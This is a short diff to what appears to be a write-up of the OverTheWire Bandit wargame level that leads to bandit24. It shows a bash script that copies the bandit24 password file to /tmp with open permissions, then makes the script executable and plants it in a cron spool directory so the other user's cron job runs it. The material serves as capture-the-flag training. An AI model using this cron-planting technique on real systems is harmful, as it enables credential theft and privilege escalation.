@@ -21,3 +21,6 @@ Retrieve the password for `bandit24` by inspecting a system `cron` job and creat
 #!/bin/bash
 cat /etc/bandit_pass/bandit24 > /tmp/my_dir/password.txt
 chmod 666 /tmp/my_dir/password.txt
+##Set Permissions & Execute
+chmod 777 /tmp/my_dir/script.sh
+cp /tmp/my_dir/script.sh /var/spool/bandit24/foo/
